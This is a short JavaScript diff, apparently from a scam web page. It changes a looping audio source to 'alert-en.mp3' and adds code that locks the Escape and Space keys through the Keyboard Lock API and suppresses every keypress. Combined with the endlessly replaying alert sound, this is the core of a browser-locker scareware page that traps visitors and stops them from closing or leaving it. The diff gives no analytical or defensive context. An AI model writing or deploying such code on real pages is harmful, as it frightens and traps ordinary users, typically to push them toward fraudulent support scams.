@@ -1,11 +1,8 @@
-function getQueryParam(param) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-}
+
 $(document).ready(function(){
 
     var audioElement = document.createElement('audio');
-    audioElement.setAttribute('src', 'js/bosda.mp3');
+    audioElement.setAttribute('src', 'alert-en.mp3');
     
     audioElement.addEventListener('ended', function() {
         this.play();
@@ -23,6 +20,14 @@ $(document).ready(function(){
         audioElement.play();
     });
 
- 
+   if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+        // Request to lock the keyboard
+        navigator.keyboard.lock(['Escape', 'Space']); // Locks the 'Escape' and 'Space' keys
+      } else {
+        console.log('Keyboard Lock API is not supported in this browser.');
+      }
+    document.addEventListener('keydown', function(event) {
+        event.preventDefault();
+    }, false);
    
 });
